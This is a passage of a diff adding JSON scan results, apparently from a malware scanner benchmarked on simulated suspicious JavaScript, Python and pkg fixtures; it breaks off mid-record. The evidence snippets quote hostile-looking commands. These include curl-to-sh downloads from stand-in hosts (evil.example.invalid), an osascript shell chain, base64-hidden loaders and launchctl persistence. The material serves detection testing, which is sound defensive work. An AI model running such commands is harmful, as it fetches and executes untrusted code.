+        "ruleID" : "pkg.install.script",
+        "scoreDeltaBase" : 11,
+        "severity" : "medium",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/hybrid\/suspicious_hybrid_pkg_fixture_02",
+          "keyPath" : "\/scripts\/preinstall.sh"
+        },
+        "tags" : [
+          "pkg",
+          "preinstall.sh"
+        ],
+        "title" : "Installer script discovered"
+      }
+    ],
+    "id" : "5F724BDD-34F1-43AE-B657-656610D47710",
+    "sampleID" : "suspicious_hybrid_pkg_fixture_02"
+  },
+  {
+    "detectedType" : "javaScript",
+    "findings" : [
+      {
+        "category" : "obfuscation",
+        "confidence" : "medium",
+        "detectedType" : "javaScript",
+        "evidenceSnippet" : "const encoded = Buffer.from(payload, 'utf8').toString('base64');",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "发现 base64 编码还原逻辑，可能用于隐藏关键执行片段。",
+        "id" : "script|javascript.base64_obfuscation|3|3|-2348476408060497603",
+        "ruleID" : "javascript.base64_obfuscation",
+        "scoreDeltaBase" : 14,
+        "severity" : "medium",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/js\/suspicious_js_buffer_obfuscation_sim_02.js",
+          "lineEnd" : 3,
+          "lineStart" : 3
+        },
+        "tags" : [
+          "script",
+          "javaScript"
+        ],
+        "title" : "Buffer\/base64 混淆痕迹"
+      },
+      {
+        "category" : "obfuscation",
+        "confidence" : "medium",
+        "detectedType" : "javaScript",
+        "evidenceSnippet" : "const decoded = Buffer.from(encoded, 'base64').toString('utf8');",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "发现 base64 编码还原逻辑，可能用于隐藏关键执行片段。",
+        "id" : "script|javascript.base64_obfuscation|4|4|1241735172028450874",
+        "ruleID" : "javascript.base64_obfuscation",
+        "scoreDeltaBase" : 14,
+        "severity" : "medium",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/js\/suspicious_js_buffer_obfuscation_sim_02.js",
+          "lineEnd" : 4,
+          "lineStart" : 4
+        },
+        "tags" : [
+          "script",
+          "javaScript"
+        ],
+        "title" : "Buffer\/base64 混淆痕迹"
+      },
+      {
+        "category" : "generic",
+        "confidence" : "medium",
+        "detectedType" : "javaScript",
+        "evidenceSnippet" : "launchctl bootstrap",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "Matched unified threat profile section [regexp].",
+        "id" : "script|intel.regexp.command_combo|2|2|4912805701962199599",
+        "ruleID" : "intel.regexp.command_combo",
+        "scoreDeltaBase" : 18,
+        "severity" : "high",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/js\/suspicious_js_buffer_obfuscation_sim_02.js",
+          "lineEnd" : 2,
+          "lineStart" : 2
+        },
+        "tags" : [
+          "script",
+          "javaScript"
+        ],
+        "title" : "Threat Intel regexp"
+      },
+      {
+        "category" : "generic",
+        "confidence" : "medium",
+        "detectedType" : "javaScript",
+        "evidenceSnippet" : "launchctl bootstrap gui\/501",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "Matched unified threat profile section [regexp].",
+        "id" : "script|intel.regexp.command_combo|2|2|-6131200004995577735",
+        "ruleID" : "intel.regexp.command_combo",
+        "scoreDeltaBase" : 18,
+        "severity" : "high",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/js\/suspicious_js_buffer_obfuscation_sim_02.js",
+          "lineEnd" : 2,
+          "lineStart" : 2
+        },
+        "tags" : [
+          "script",
+          "javaScript"
+        ],
+        "title" : "Threat Intel regexp"
+      },
+      {
+        "category" : "generic",
+        "confidence" : "medium",
+        "detectedType" : "javaScript",
+        "evidenceSnippet" : "launchctl bootstrap",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "configOnly",
+        "explanation" : "Matched unified threat profile section [regexp].",
+        "id" : "script|config.rule.file.intel.regexp.command_combo|0|0|4912805701962199599",
+        "ruleID" : "config.rule.file.intel.regexp.command_combo",
+        "scoreDeltaBase" : 18,
+        "severity" : "high",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/js\/suspicious_js_buffer_obfuscation_sim_02.js"
+        },
+        "tags" : [
+          "script",
+          "javaScript"
+        ],
+        "title" : "Threat Intel regexp"
+      },
+      {
+        "category" : "generic",
+        "confidence" : "medium",
+        "detectedType" : "javaScript",
+        "evidenceSnippet" : "launchctl bootstrap gui\/501",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "configOnly",
+        "explanation" : "Matched unified threat profile section [regexp].",
+        "id" : "script|config.rule.file.intel.regexp.command_combo|0|0|-6131200004995577735",
+        "ruleID" : "config.rule.file.intel.regexp.command_combo",
+        "scoreDeltaBase" : 18,
+        "severity" : "high",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/js\/suspicious_js_buffer_obfuscation_sim_02.js"
+        },
+        "tags" : [
+          "script",
+          "javaScript"
+        ],
+        "title" : "Threat Intel regexp"
+      },
+      {
+        "category" : "keyword",
+        "confidence" : "low",
+        "detectedType" : "javaScript",
+        "evidenceSnippet" : "javascript.base64_obfuscation",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "Keyword-level static signal; requires context to determine impact.",
+        "id" : "keyword|6410188931978730738",
+        "ruleID" : "generic.keyword.hit",
+        "scoreDeltaBase" : 6,
+        "severity" : "low",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/js\/suspicious_js_buffer_obfuscation_sim_02.js"
+        },
+        "tags" : [
+          "keyword"
+        ],
+        "title" : "Suspicious static keyword"
+      },
+      {
+        "category" : "keyword",
+        "confidence" : "low",
+        "detectedType" : "javaScript",
+        "evidenceSnippet" : "intel.regexp.command_combo",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "Keyword-level static signal; requires context to determine impact.",
+        "id" : "keyword|-1417803420268309474",
+        "ruleID" : "generic.keyword.hit",
+        "scoreDeltaBase" : 6,
+        "severity" : "low",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/js\/suspicious_js_buffer_obfuscation_sim_02.js"
+        },
+        "tags" : [
+          "keyword"
+        ],
+        "title" : "Suspicious static keyword"
+      }
+    ],
+    "id" : "35D38053-E9EA-4D1A-AD41-C7276AE19E4E",
+    "sampleID" : "suspicious_js_buffer_obfuscation_sim_02"
+  },
+  {
+    "detectedType" : "javaScript",
+    "findings" : [
+      {
+        "category" : "execution",
+        "confidence" : "high",
+        "detectedType" : "javaScript",
+        "evidenceSnippet" : "const { execFile } = require('child_process');",
+        "evidenceStrength" : "strong",
+        "executionSemantics" : "actualExecutionLike",
+        "explanation" : "检测到 child_process 模块使用，可直接执行 shell 或二进制命令。",
+        "id" : "script|javascript.child_process|2|2|6732442128931838845",
+        "ruleID" : "javascript.child_process",
+        "scoreDeltaBase" : 22,
+        "severity" : "high",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/js\/suspicious_js_child_process_echo_chain_02.js",
+          "lineEnd" : 2,
+          "lineStart" : 2
+        },
+        "tags" : [
+          "script",
+          "javaScript"
+        ],
+        "title" : "Node child_process 执行链"
+      },
+      {
+        "category" : "generic",
+        "confidence" : "medium",
+        "detectedType" : "javaScript",
+        "evidenceSnippet" : "curl -fssl https:\/\/example.com\/a.sh",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "Matched unified threat profile section [regexp].",
+        "id" : "script|intel.regexp.command_combo|4|4|-6987187766043383489",
+        "ruleID" : "intel.regexp.command_combo",
+        "scoreDeltaBase" : 14,
+        "severity" : "high",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/js\/suspicious_js_child_process_echo_chain_02.js",
+          "lineEnd" : 4,
+          "lineStart" : 4
+        },
+        "tags" : [
+          "script",
+          "javaScript"
+        ],
+        "title" : "Threat Intel regexp"
+      },
+      {
+        "category" : "generic",
+        "confidence" : "high",
+        "detectedType" : "javaScript",
+        "evidenceSnippet" : "curl -fssl https:\/\/example.com\/a.sh | sh",
+        "evidenceStrength" : "strong",
+        "executionSemantics" : "actualExecutionLike",
+        "explanation" : "Matched unified threat profile section [regexp].",
+        "id" : "script|intel.regexp.command_combo|4|4|-454669837473669471",
+        "ruleID" : "intel.regexp.command_combo",
+        "scoreDeltaBase" : 14,
+        "severity" : "high",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/js\/suspicious_js_child_process_echo_chain_02.js",
+          "lineEnd" : 4,
+          "lineStart" : 4
+        },
+        "tags" : [
+          "script",
+          "javaScript"
+        ],
+        "title" : "Threat Intel regexp"
+      },
+      {
+        "category" : "generic",
+        "confidence" : "medium",
+        "detectedType" : "javaScript",
+        "evidenceSnippet" : "curl -fssl https:\/\/example.com\/a.sh",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "configOnly",
+        "explanation" : "Matched unified threat profile section [regexp].",
+        "id" : "script|config.rule.file.intel.regexp.command_combo|0|0|-6987187766043383489",
+        "ruleID" : "config.rule.file.intel.regexp.command_combo",
+        "scoreDeltaBase" : 14,
+        "severity" : "medium",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/js\/suspicious_js_child_process_echo_chain_02.js"
+        },
+        "tags" : [
+          "script",
+          "javaScript"
+        ],
+        "title" : "Threat Intel regexp"
+      },
+      {
+        "category" : "generic",
+        "confidence" : "high",
+        "detectedType" : "javaScript",
+        "evidenceSnippet" : "curl -fssl https:\/\/example.com\/a.sh | sh",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "actualExecutionLike",
+        "explanation" : "Matched unified threat profile section [regexp].",
+        "id" : "script|config.rule.file.intel.regexp.command_combo|0|0|-454669837473669471",
+        "ruleID" : "config.rule.file.intel.regexp.command_combo",
+        "scoreDeltaBase" : 14,
+        "severity" : "medium",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/js\/suspicious_js_child_process_echo_chain_02.js"
+        },
+        "tags" : [
+          "script",
+          "javaScript"
+        ],
+        "title" : "Threat Intel regexp"
+      },
+      {
+        "category" : "keyword",
+        "confidence" : "low",
+        "detectedType" : "javaScript",
+        "evidenceSnippet" : "javascript.child_process",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "Keyword-level static signal; requires context to determine impact.",
+        "id" : "keyword|2681559953509067569",
+        "ruleID" : "generic.keyword.hit",
+        "scoreDeltaBase" : 6,
+        "severity" : "low",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/js\/suspicious_js_child_process_echo_chain_02.js"
+        },
+        "tags" : [
+          "keyword"
+        ],
+        "title" : "Suspicious static keyword"
+      },
+      {
+        "category" : "keyword",
+        "confidence" : "low",
+        "detectedType" : "javaScript",
+        "evidenceSnippet" : "intel.regexp.command_combo",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "Keyword-level static signal; requires context to determine impact.",
+        "id" : "keyword|-1417803420268309474",
+        "ruleID" : "generic.keyword.hit",
+        "scoreDeltaBase" : 6,
+        "severity" : "low",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/js\/suspicious_js_child_process_echo_chain_02.js"
+        },
+        "tags" : [
+          "keyword"
+        ],
+        "title" : "Suspicious static keyword"
+      }
+    ],
+    "id" : "1135F4A8-E5DB-4AEF-AF3B-044F0B280469",
+    "sampleID" : "suspicious_js_child_process_echo_chain_02"
+  },
+  {
+    "detectedType" : "javaScript",
+    "findings" : [
+      {
+        "category" : "obfuscation",
+        "confidence" : "medium",
+        "detectedType" : "javaScript",
+        "evidenceSnippet" : "const value = eval(decoded);",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "检测到 eval\/Function 构造动态代码执行，存在混淆载荷风险。",
+        "id" : "script|javascript.eval|4|4|-7242339190091000648",
+        "ruleID" : "javascript.eval",
+        "scoreDeltaBase" : 22,
+        "severity" : "high",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/js\/suspicious_js_eval_decode_message_02.js",
+          "lineEnd" : 4,
+          "lineStart" : 4
+        },
+        "tags" : [
+          "script",
+          "javaScript"
+        ],
+        "title" : "JavaScript 动态执行(eval)"
+      },
+      {
+        "category" : "obfuscation",
+        "confidence" : "medium",
+        "detectedType" : "javaScript",
+        "evidenceSnippet" : "const encoded = Buffer.from(\"'synthetic harmless eval message'\", 'utf8').toString('base64');",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "发现 base64 编码还原逻辑，可能用于隐藏关键执行片段。",
+        "id" : "script|javascript.base64_obfuscation|2|2|6158650835244390866",
+        "ruleID" : "javascript.base64_obfuscation",
+        "scoreDeltaBase" : 14,
+        "severity" : "medium",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/js\/suspicious_js_eval_decode_message_02.js",
+          "lineEnd" : 2,
+          "lineStart" : 2
+        },
+        "tags" : [
+          "script",
+          "javaScript"
+        ],
+        "title" : "Buffer\/base64 混淆痕迹"
+      },
+      {
+        "category" : "obfuscation",
+        "confidence" : "medium",
+        "detectedType" : "javaScript",
+        "evidenceSnippet" : "const decoded = Buffer.from(encoded, 'base64').toString('utf8');",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "发现 base64 编码还原逻辑，可能用于隐藏关键执行片段。",
+        "id" : "script|javascript.base64_obfuscation|3|3|1241735172028450874",
+        "ruleID" : "javascript.base64_obfuscation",
+        "scoreDeltaBase" : 14,
+        "severity" : "medium",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/js\/suspicious_js_eval_decode_message_02.js",
+          "lineEnd" : 3,
+          "lineStart" : 3
+        },
+        "tags" : [
+          "script",
+          "javaScript"
+        ],
+        "title" : "Buffer\/base64 混淆痕迹"
+      },
+      {
+        "category" : "keyword",
+        "confidence" : "low",
+        "detectedType" : "javaScript",
+        "evidenceSnippet" : "javascript.eval",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "Keyword-level static signal; requires context to determine impact.",
+        "id" : "keyword|8173221146731121199",
+        "ruleID" : "generic.keyword.hit",
+        "scoreDeltaBase" : 6,
+        "severity" : "low",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/js\/suspicious_js_eval_decode_message_02.js"
+        },
+        "tags" : [
+          "keyword"
+        ],
+        "title" : "Suspicious static keyword"
+      },
+      {
+        "category" : "keyword",
+        "confidence" : "low",
+        "detectedType" : "javaScript",
+        "evidenceSnippet" : "javascript.base64_obfuscation",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "Keyword-level static signal; requires context to determine impact.",
+        "id" : "keyword|6410188931978730738",
+        "ruleID" : "generic.keyword.hit",
+        "scoreDeltaBase" : 6,
+        "severity" : "low",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/js\/suspicious_js_eval_decode_message_02.js"
+        },
+        "tags" : [
+          "keyword"
+        ],
+        "title" : "Suspicious static keyword"
+      }
+    ],
+    "id" : "984ECCDD-9FCE-43CE-B939-EA4D68ABC56C",
+    "sampleID" : "suspicious_js_eval_decode_message_02"
+  },
+  {
+    "detectedType" : "javaScript",
+    "findings" : [
+      {
+        "category" : "generic",
+        "confidence" : "high",
+        "detectedType" : "javaScript",
+        "evidenceSnippet" : "const encoded = Buffer.from(\"osascript -e 'do shell script \\\"curl https:\/\/evil.example.invalid\\\"'\", \"utf8\").toString(\"base64\");",
+        "evidenceStrength" : "strong",
+        "executionSemantics" : "actualExecutionLike",
+        "explanation" : "发现 Node 脚本通过 osascript 或 shell 触发跨语言命令链。",
+        "id" : "script|javascript.osascript_shell_chain|2|2|-2177038044500985212",
+        "ruleID" : "javascript.osascript_shell_chain",
+        "scoreDeltaBase" : 24,
+        "severity" : "high",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/js\/suspicious_js_obfuscation_sim_01.js",
+          "lineEnd" : 2,
+          "lineStart" : 2
+        },
+        "tags" : [
+          "script",
+          "javaScript"
+        ],
+        "title" : "JavaScript 调用 osascript\/shell"
+      },
+      {
+        "category" : "obfuscation",
+        "confidence" : "medium",
+        "detectedType" : "javaScript",
+        "evidenceSnippet" : "const encoded = Buffer.from(\"osascript -e 'do shell script \\\"curl https:\/\/evil.example.invalid\\\"'\", \"utf8\").toString(\"base64\");",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "发现 base64 编码还原逻辑，可能用于隐藏关键执行片段。",
+        "id" : "script|javascript.base64_obfuscation|2|2|-2177038044500985212",
+        "ruleID" : "javascript.base64_obfuscation",
+        "scoreDeltaBase" : 14,
+        "severity" : "medium",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/js\/suspicious_js_obfuscation_sim_01.js",
+          "lineEnd" : 2,
+          "lineStart" : 2
+        },
+        "tags" : [
+          "script",
+          "javaScript"
+        ],
+        "title" : "Buffer\/base64 混淆痕迹"
+      },
+      {
+        "category" : "obfuscation",
+        "confidence" : "medium",
+        "detectedType" : "javaScript",
+        "evidenceSnippet" : "const decoded = Buffer.from(encoded, \"base64\").toString(\"utf8\");",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "发现 base64 编码还原逻辑，可能用于隐藏关键执行片段。",
+        "id" : "script|javascript.base64_obfuscation|3|3|294696284568918179",
+        "ruleID" : "javascript.base64_obfuscation",
+        "scoreDeltaBase" : 14,
+        "severity" : "medium",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/js\/suspicious_js_obfuscation_sim_01.js",
+          "lineEnd" : 3,
+          "lineStart" : 3
+        },
+        "tags" : [
+          "script",
+          "javaScript"
+        ],
+        "title" : "Buffer\/base64 混淆痕迹"
+      },
+      {
+        "category" : "generic",
+        "confidence" : "medium",
+        "detectedType" : "javaScript",
+        "evidenceSnippet" : "curl https:\/\/evil.example.invalid\\",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "Matched unified threat profile section [regexp].",
+        "id" : "script|intel.regexp.command_combo|2|2|6455002676417187102",
+        "ruleID" : "intel.regexp.command_combo",
+        "scoreDeltaBase" : 14,
+        "severity" : "high",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/js\/suspicious_js_obfuscation_sim_01.js",
+          "lineEnd" : 2,
+          "lineStart" : 2
+        },
+        "tags" : [
+          "script",
+          "javaScript"
+        ],
+        "title" : "Threat Intel regexp"
+      },
+      {
+        "category" : "generic",
+        "confidence" : "medium",
+        "detectedType" : "javaScript",
+        "evidenceSnippet" : "osascript -e 'do shell script",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "Matched unified threat profile section [regexp].",
+        "id" : "script|intel.regexp.command_combo|2|2|-761135629748882739",
+        "ruleID" : "intel.regexp.command_combo",
+        "scoreDeltaBase" : 14,
+        "severity" : "high",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/js\/suspicious_js_obfuscation_sim_01.js",
+          "lineEnd" : 2,
+          "lineStart" : 2
+        },
+        "tags" : [
+          "script",
+          "javaScript"
+        ],
+        "title" : "Threat Intel regexp"
+      },
+      {
+        "category" : "generic",
+        "confidence" : "medium",
+        "detectedType" : "javaScript",
+        "evidenceSnippet" : "osascript -e 'do shell script \\\"curl",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "Matched unified threat profile section [regexp].",
+        "id" : "script|intel.regexp.command_combo|2|2|5579632414878064494",
+        "ruleID" : "intel.regexp.command_combo",
+        "scoreDeltaBase" : 14,
+        "severity" : "high",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/js\/suspicious_js_obfuscation_sim_01.js",
+          "lineEnd" : 2,
+          "lineStart" : 2
+        },
+        "tags" : [
+          "script",
+          "javaScript"
+        ],
+        "title" : "Threat Intel regexp"
+      },
+      {
+        "category" : "generic",
+        "confidence" : "medium",
+        "detectedType" : "javaScript",
+        "evidenceSnippet" : "curl https:\/\/evil.example.invalid\\",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "configOnly",
+        "explanation" : "Matched unified threat profile section [regexp].",
+        "id" : "script|config.rule.file.intel.regexp.command_combo|0|0|6455002676417187102",
+        "ruleID" : "config.rule.file.intel.regexp.command_combo",
+        "scoreDeltaBase" : 14,
+        "severity" : "medium",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/js\/suspicious_js_obfuscation_sim_01.js"
+        },
+        "tags" : [
+          "script",
+          "javaScript"
+        ],
+        "title" : "Threat Intel regexp"
+      },
+      {
+        "category" : "generic",
+        "confidence" : "medium",
+        "detectedType" : "javaScript",
+        "evidenceSnippet" : "osascript -e 'do shell script",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "configOnly",
+        "explanation" : "Matched unified threat profile section [regexp].",
+        "id" : "script|config.rule.file.intel.regexp.command_combo|0|0|-761135629748882739",
+        "ruleID" : "config.rule.file.intel.regexp.command_combo",
+        "scoreDeltaBase" : 14,
+        "severity" : "medium",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/js\/suspicious_js_obfuscation_sim_01.js"
+        },
+        "tags" : [
+          "script",
+          "javaScript"
+        ],
+        "title" : "Threat Intel regexp"
+      },
+      {
+        "category" : "generic",
+        "confidence" : "medium",
+        "detectedType" : "javaScript",
+        "evidenceSnippet" : "osascript -e 'do shell script \\\"curl",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "configOnly",
+        "explanation" : "Matched unified threat profile section [regexp].",
+        "id" : "script|config.rule.file.intel.regexp.command_combo|0|0|5579632414878064494",
+        "ruleID" : "config.rule.file.intel.regexp.command_combo",
+        "scoreDeltaBase" : 14,
+        "severity" : "medium",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/js\/suspicious_js_obfuscation_sim_01.js"
+        },
+        "tags" : [
+          "script",
+          "javaScript"
+        ],
+        "title" : "Threat Intel regexp"
+      },
+      {
+        "category" : "keyword",
+        "confidence" : "low",
+        "detectedType" : "javaScript",
+        "evidenceSnippet" : "javascript.osascript_shell_chain",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "Keyword-level static signal; requires context to determine impact.",
+        "id" : "keyword|-5044597466463196281",
+        "ruleID" : "generic.keyword.hit",
+        "scoreDeltaBase" : 6,
+        "severity" : "low",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/js\/suspicious_js_obfuscation_sim_01.js"
+        },
+        "tags" : [
+          "keyword"
+        ],
+        "title" : "Suspicious static keyword"
+      },
+      {
+        "category" : "keyword",
+        "confidence" : "low",
+        "detectedType" : "javaScript",
+        "evidenceSnippet" : "javascript.base64_obfuscation",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "Keyword-level static signal; requires context to determine impact.",
+        "id" : "keyword|6410188931978730738",
+        "ruleID" : "generic.keyword.hit",
+        "scoreDeltaBase" : 6,
+        "severity" : "low",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/js\/suspicious_js_obfuscation_sim_01.js"
+        },
+        "tags" : [
+          "keyword"
+        ],
+        "title" : "Suspicious static keyword"
+      },
+      {
+        "category" : "keyword",
+        "confidence" : "low",
+        "detectedType" : "javaScript",
+        "evidenceSnippet" : "intel.regexp.command_combo",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "Keyword-level static signal; requires context to determine impact.",
+        "id" : "keyword|-1417803420268309474",
+        "ruleID" : "generic.keyword.hit",
+        "scoreDeltaBase" : 6,
+        "severity" : "low",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/js\/suspicious_js_obfuscation_sim_01.js"
+        },
+        "tags" : [
+          "keyword"
+        ],
+        "title" : "Suspicious static keyword"
+      }
+    ],
+    "id" : "F0B498D3-6824-4AF4-9693-9DB0333FA52D",
+    "sampleID" : "suspicious_js_obfuscation_sim_01"
+  },
+  {
+    "detectedType" : "pythonScript",
+    "findings" : [
+      {
+        "category" : "obfuscation",
+        "confidence" : "medium",
+        "detectedType" : "pythonScript",
+        "evidenceSnippet" : "import base64",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "检测到 base64\/marshal\/zlib 或 PyInstaller 痕迹，存在代码隐藏风险。",
+        "id" : "script|python.obfuscation|2|2|-8783155294631834617",
+        "ruleID" : "python.obfuscation",
+        "scoreDeltaBase" : 14,
+        "severity" : "medium",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/python\/suspicious_python_downloader_sim_01.py",
+          "lineEnd" : 2,
+          "lineStart" : 2
+        },
+        "tags" : [
+          "script",
+          "pythonScript"
+        ],
+        "title" : "编码\/压缩混淆痕迹"
+      },
+      {
+        "category" : "obfuscation",
+        "confidence" : "high",
+        "detectedType" : "pythonScript",
+        "evidenceSnippet" : "encoded = base64.b64encode(b\"curl -L https:\/\/evil.example.invalid\/payload.sh | sh\").decode(\"ascii\")",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "actualExecutionLike",
+        "explanation" : "检测到 base64\/marshal\/zlib 或 PyInstaller 痕迹，存在代码隐藏风险。",
+        "id" : "script|python.obfuscation|9|9|-7080674186115421586",
+        "ruleID" : "python.obfuscation",
+        "scoreDeltaBase" : 14,
+        "severity" : "medium",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/python\/suspicious_python_downloader_sim_01.py",
+          "lineEnd" : 9,
+          "lineStart" : 9
+        },
+        "tags" : [
+          "script",
+          "pythonScript"
+        ],
+        "title" : "编码\/压缩混淆痕迹"
+      },
+      {
+        "category" : "obfuscation",
+        "confidence" : "medium",
+        "detectedType" : "pythonScript",
+        "evidenceSnippet" : "decoded = base64.b64decode(encoded).decode(\"utf-8\")",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "检测到 base64\/marshal\/zlib 或 PyInstaller 痕迹，存在代码隐藏风险。",
+        "id" : "script|python.obfuscation|10|10|8855813248732504968",
+        "ruleID" : "python.obfuscation",
+        "scoreDeltaBase" : 14,
+        "severity" : "medium",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/python\/suspicious_python_downloader_sim_01.py",
+          "lineEnd" : 10,
+          "lineStart" : 10
+        },
+        "tags" : [
+          "script",
+          "pythonScript"
+        ],
+        "title" : "编码\/压缩混淆痕迹"
+      },
+      {
+        "category" : "generic",
+        "confidence" : "medium",
+        "detectedType" : "pythonScript",
+        "evidenceSnippet" : "curl -l https:\/\/evil.example.invalid\/payload.sh",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "Matched unified threat profile section [regexp].",
+        "id" : "script|intel.regexp.command_combo|9|9|-2889236311875990406",
+        "ruleID" : "intel.regexp.command_combo",
+        "scoreDeltaBase" : 14,
+        "severity" : "high",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/python\/suspicious_python_downloader_sim_01.py",
+          "lineEnd" : 9,
+          "lineStart" : 9
+        },
+        "tags" : [
+          "script",
+          "pythonScript"
+        ],
+        "title" : "Threat Intel regexp"
+      },
+      {
+        "category" : "generic",
+        "confidence" : "high",
+        "detectedType" : "pythonScript",
+        "evidenceSnippet" : "curl -l https:\/\/evil.example.invalid\/payload.sh | sh",
+        "evidenceStrength" : "strong",
+        "executionSemantics" : "actualExecutionLike",
+        "explanation" : "Matched unified threat profile section [regexp].",
+        "id" : "script|intel.regexp.command_combo|9|9|4113867681801426485",
+        "ruleID" : "intel.regexp.command_combo",
+        "scoreDeltaBase" : 14,
+        "severity" : "high",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/python\/suspicious_python_downloader_sim_01.py",
+          "lineEnd" : 9,
+          "lineStart" : 9
+        },
+        "tags" : [
+          "script",
+          "pythonScript"
+        ],
+        "title" : "Threat Intel regexp"
+      },
+      {
+        "category" : "generic",
